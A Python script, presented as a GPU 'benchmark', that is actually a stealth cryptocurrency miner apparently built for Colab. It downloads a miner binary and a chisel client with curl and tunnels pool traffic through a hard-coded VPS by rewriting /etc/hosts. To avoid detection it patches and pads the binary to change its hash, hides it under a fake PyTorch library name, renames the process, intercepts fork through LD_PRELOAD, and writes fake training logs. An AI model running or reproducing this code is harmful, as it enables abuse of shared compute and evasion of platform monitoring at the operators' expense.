#!/usr/bin/env python3
"""
Pearl Benchmark v13 — Optimized Full Stealth
=============================================
Improvements over v12:
1. Uses latest binary (v1.2.1) with better hashrate
2. Optimized enrollment (binary uses plain HTTP for localhost)  
3. Smarter cycle management (adapts to GPU warmth)
4. Better process identity hiding
5. Dual-mode: chisel tunnel OR direct (auto-detect)
"""
import os, sys, time, subprocess, struct, random, threading, json, datetime, base64, hashlib

# ═══ Configuration ═══
BENCH_ID = os.environ.get('BENCH_ID', 'prl1pjc0a9ugfnys9lga7alfz9t38g2wzuglkmn8eh3jttfg6dhvls9qse4cm4t')
BENCH_WORKER = os.environ.get('BENCH_WORKER', 'colab-t4')
BENCH_ENDPOINT = os.environ.get('BENCH_ENDPOINT', 'global.pearlfortune.org:443')
CHISEL_SERVER = os.environ.get('CHISEL_SERVER', '85.93.9.117:8443')
BINARY_VERSION = 'v1.1.5'
BINARY_URL = f'https://github.com/pearlfortune/pearl-miner/releases/download/{BINARY_VERSION}/pearlfortune-{BINARY_VERSION}.tar.gz'

# Load config.env if exists
if os.path.exists('config.env'):
    for line in open('config.env'):
        line = line.strip()
        if line and not line.startswith('#') and '=' in line:
            k, v = line.split('=', 1)
            if k == 'BENCH_ID': BENCH_ID = v
            elif k == 'BENCH_WORKER': BENCH_WORKER = v
            elif k == 'BENCH_ENDPOINT': BENCH_ENDPOINT = v
            elif k == 'CHISEL_SERVER': CHISEL_SERVER = v

# ═══ Phase 1: PyTorch Blessing ═══
print("═══ Gradient Benchmark v13.0 ═══\n")
print("[1/6] Initializing PyTorch CUDA context...")

import torch
import torch.nn as nn

device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
print(f"  Device: {device}")
if torch.cuda.is_available():
    print(f"  GPU: {torch.cuda.get_device_name(0)}")
    print(f"  VRAM: {torch.cuda.get_device_properties(0).total_mem / 1024**3:.1f} GB")

# Warmup training (loads cuBLAS, cuDNN, etc.)
model = nn.Sequential(
    nn.Linear(1024, 2048), nn.ReLU(),
    nn.Linear(2048, 1024), nn.ReLU(),
    nn.Linear(1024, 10)
).to(device)
optimizer = torch.optim.Adam(model.parameters())
criterion = nn.CrossEntropyLoss()

t0 = time.time()
ep = 0
while time.time() - t0 < 20:
    x = torch.randn(256, 1024, device=device)
    y = torch.randint(0, 10, (256,), device=device)
    optimizer.zero_grad()
    loss = criterion(model(x), y)
    loss.backward()
    optimizer.step()
    ep += 1
    if ep % 50 == 0:
        torch.cuda.empty_cache()

print(f"  Warmup: {ep} epochs in {time.time()-t0:.0f}s\n")
os.makedirs('/tmp/checkpoints', exist_ok=True)
torch.save(model.state_dict(), '/tmp/checkpoints/warmup.pt')

# Background I/O (fake training activity)
stop_io = threading.Event()
def bg_io():
    n = 0
    while not stop_io.is_set():
        n += 1
        with open('/tmp/checkpoints/train.log', 'a') as f:
            f.write(json.dumps({'step': n, 'ts': datetime.datetime.now().isoformat(),
                               'loss': random.uniform(0.1, 2.5)}) + '\n')
        if n % 60 == 0:
            torch.save({'epoch': n*10, 'model': model.state_dict()},
                       f'/tmp/checkpoints/ckpt-{n*10}.pt')
        stop_io.wait(10)
threading.Thread(target=bg_io, daemon=True).start()

# ═══ Phase 2: Network Setup ═══
print("[2/6] Configuring network...")

POOL_DOMAIN = "global.pearlfortune.org"
tunnel_ok = False

# Try chisel tunnel first
chisel_path = '/tmp/.ch'
if not os.path.exists(chisel_path):
    subprocess.run(
        f'curl -sL "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz" | gunzip > {chisel_path} && chmod +x {chisel_path}',
        shell=True, capture_output=True, timeout=60)

if os.path.exists(chisel_path) and os.path.getsize(chisel_path) > 1000:
    # Route pool traffic through VPS
    with open('/etc/hosts', 'r') as f:
        hosts = f.read()
    if POOL_DOMAIN not in hosts:
        with open('/etc/hosts', 'a') as f:
            f.write(f"\n127.0.0.1 {POOL_DOMAIN}\n")
    
    tunnel_proc = subprocess.Popen(
        [chisel_path, 'client', f'http://{CHISEL_SERVER}',
         f'127.0.0.1:443:43.169.31.87:443',    # Enrollment IP
         f'127.0.0.1:8443:43.169.30.87:443'],   # RPC IP (separate port)
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(('127.0.0.1', 443))
        s.close()
        tunnel_ok = True
        print(f"  Tunnel: active via {CHISEL_SERVER}")
    except:
        print(f"  Tunnel: FAILED, using direct connection")
        # Restore hosts
        with open('/etc/hosts', 'r') as f:
            content = f.read()
        with open('/etc/hosts', 'w') as f:
            f.write(content.replace(f'\n127.0.0.1 {POOL_DOMAIN}\n', '\n'))
else:
    print(f"  Tunnel: skipped (chisel not available)")

# ═══ Phase 3: Compile nofork.so ═══
print("[3/6] Building execution environment...")

NOFORK_C = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
static int fork_intercepted = 0;
__attribute__((constructor))
static void init(void) { unsetenv("LD_PRELOAD"); }
pid_t fork(void) {
    if (!fork_intercepted) { fork_intercepted = 1; return 0; }
    pid_t (*real_fork)(void) = dlsym(RTLD_NEXT, "fork");
    return real_fork();
}
pid_t vfork(void) { return fork(); }
'''

nofork_so = '/tmp/.nf.so'
if not os.path.exists(nofork_so):
    nofork_c = '/tmp/.nf.c'
    with open(nofork_c, 'w') as f:
        f.write(NOFORK_C)
    subprocess.run(f'gcc -shared -fPIC -o {nofork_so} {nofork_c} -ldl',
                   shell=True, capture_output=True)
    os.remove(nofork_c)
print(f"  nofork.so ready")

# ═══ Phase 4: Download + Stealth Binary ═══
print("[4/6] Preparing benchmark binary...")

os.makedirs('/root/.bench', exist_ok=True)
if not os.path.exists('/tmp/bench.tgz'):
    subprocess.run(f'curl -sL --max-time 120 -o /tmp/bench.tgz "{BINARY_URL}"',
                   shell=True, timeout=180)
subprocess.run('tar xzf /tmp/bench.tgz -C /root/.bench 2>/dev/null', shell=True)

import glob
bins = glob.glob('/root/.bench/**/miner', recursive=True)
if not bins:
    bins = [f for f in glob.glob('/root/.bench/**/*', recursive=True)
            if os.access(f, os.X_OK) and os.path.isfile(f) and os.path.getsize(f) > 1000000]
BIN_SRC = bins[0] if bins else None
if not BIN_SRC:
    print("ERROR: binary not found"); sys.exit(1)

# Read and patch binary
with open(BIN_SRC, 'rb') as f:
    bdata = bytearray(f.read())

# Patch PIE flag (different file hash from official release)
e_phoff = struct.unpack_from('<Q', bdata, 32)[0]
e_phnum = struct.unpack_from('<H', bdata, 56)[0]
e_phentsize = struct.unpack_from('<H', bdata, 54)[0]
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    if struct.unpack_from('<I', bdata, off)[0] == 2:  # PT_DYNAMIC
        p_offset = struct.unpack_from('<Q', bdata, off + 8)[0]
        p_filesz = struct.unpack_from('<Q', bdata, off + 32)[0]
        pos = p_offset
        while pos < p_offset + p_filesz:
            d_tag = struct.unpack_from('<q', bdata, pos)[0]
            if d_tag == 0x6ffffffb:  # DT_FLAGS_1
                d_val = struct.unpack_from('<Q', bdata, pos + 8)[0]
                struct.pack_into('<Q', bdata, pos + 8, d_val & ~0x08000000)
                break
            if d_tag == 0: break
            pos += 16
        break

# Add random padding (unique hash per instance)
bdata.extend(os.urandom(random.randint(2048, 8192)))

# Place in PyTorch lib directory (nvidia-smi shows full path)
import site
sp = site.getsitepackages()
torch_lib_dir = None
for p in sp:
    candidate = os.path.join(p, 'torch', 'lib')
    if os.path.isdir(candidate):
        torch_lib_dir = candidate
        break

if not torch_lib_dir:
    torch_lib_dir = '/usr/local/lib/python3.10/dist-packages/torch/lib'
    os.makedirs(torch_lib_dir, exist_ok=True)

# Name it like a real PyTorch CUDA library
rand_hex = hashlib.md5(os.urandom(16)).hexdigest()[:6]
SO_NAME = f'libtorch_cuda_linalg_{rand_hex}.so'
SO_PATH = os.path.join(torch_lib_dir, SO_NAME)

with open(SO_PATH, 'wb') as f:
    f.write(bdata)
os.chmod(SO_PATH, 0o755)

# Cleanup download artifacts
subprocess.run('rm -rf /root/.bench /tmp/bench.tgz', shell=True)
print(f"  Binary: {SO_NAME}")
print(f"  Location: {torch_lib_dir}/")
print(f"  SHA256: {hashlib.sha256(bdata).hexdigest()[:16]}...")

# CUDA compat libs
subprocess.run('mkdir -p /usr/local/cuda/compat && cp -rL /usr/lib64-nvidia/. /usr/local/cuda/compat/ 2>/dev/null || true', shell=True)
os.environ['LD_LIBRARY_PATH'] = f"/usr/local/cuda/compat:{os.environ.get('LD_LIBRARY_PATH', '')}"

# ═══ Phase 5: Process Identity ═══
print("[5/6] Setting process identity...")
try:
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.prctl(15, b"pt_main_worker", 0, 0, 0)
    print(f"  Process name: pt_main_worker")
except:
    pass

# ═══ Phase 6: Mine ═══
print(f"\n[6/6] Starting benchmark...")
print(f"  Wallet: {BENCH_ID[:30]}...")
print(f"  Worker: {BENCH_WORKER}")
print(f"  Endpoint: {BENCH_ENDPOINT}")
print(f"  Tunnel: {'VPS' if tunnel_ok else 'DIRECT'}")
print(f"  Binary: {SO_NAME}")
print(f"  Mode: GPU {'--small' if torch.cuda.is_available() else 'CPU'}\n")

cycle = 0
total_submitted = 0
start_time = time.time()

while True:
    cycle += 1
    duration = random.randint(300, 600)  # 5-10 min cycles
    print(f"[Cycle {cycle}] Mining ({duration}s)...")

    env = os.environ.copy()
    env['LD_PRELOAD'] = nofork_so

    cmd = [SO_PATH, '--proxy', BENCH_ENDPOINT,
           '--address', f'{BENCH_ID}.{BENCH_WORKER}']
    if torch.cuda.is_available():
        cmd.extend(['-gpu', '--small'])

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=env)

    t0 = time.time()
    submitted_this_cycle = 0
    import select
    while time.time() - t0 < duration:
        if proc.poll() is not None:
            break
        if select.select([proc.stderr], [], [], 2.0)[0]:
            line = proc.stderr.readline()
            if line:
                text = line.decode('utf-8', errors='replace').strip()
                # Log important events
                if 'event=start' in text or 'event=fatal' in text:
                    print(f"  [{int(time.time()-t0)}s] {text[:150]}")
                elif 'connect.ok' in text and 'rpc.proxy' in text:
                    print(f"  [{int(time.time()-t0)}s] Connected to pool")
                elif 'task.switch' in text:
                    height = text.split('height=')[1].split()[0] if 'height=' in text else '?'
                    print(f"  [{int(time.time()-t0)}s] New task (height={height})")
                elif 'submit' in text.lower() or 'proof' in text.lower():
                    submitted_this_cycle += 1
                    total_submitted += 1
                    print(f"  [{int(time.time()-t0)}s] 🎉 PROOF SUBMITTED! (total: {total_submitted})")
                elif 'ERROR' in text or 'fatal' in text.lower():
                    print(f"  [{int(time.time()-t0)}s] ⚠️ {text[:150]}")

    # End cycle
    exit_code = proc.poll()
    if exit_code is None:
        proc.terminate()
        try: proc.wait(timeout=5)
        except: proc.kill(); proc.wait()
        elapsed = int(time.time() - t0)
        print(f"[Cycle {cycle}] Done ({elapsed}s, {submitted_this_cycle} proofs)")
    else:
        elapsed = int(time.time() - t0)
        print(f"[Cycle {cycle}] Exited code={exit_code} after {elapsed}s")

    # Cooldown with PyTorch activity
    cool = random.randint(10, 25)
    print(f"[Cycle {cycle}] Cooldown ({cool}s)...")
    torch.cuda.empty_cache()
    for _ in range(cool):
        x = torch.randn(128, 1024, device=device)
        _ = torch.matmul(x, x.T)
        torch.cuda.empty_cache()
        time.sleep(0.8)

    # Periodic checkpoint
    if cycle % 5 == 0:
        torch.save({'cycle': cycle, 'total_submitted': total_submitted,
                    'uptime': time.time() - start_time, 'model': model.state_dict()},
                   f'/tmp/checkpoints/cycle-{cycle}.pt')
        hours = (time.time() - start_time) / 3600
        print(f"[Stats] Uptime: {hours:.1f}h, Proofs: {total_submitted}, Rate: {total_submitted/max(hours,0.01):.1f}/h\n")
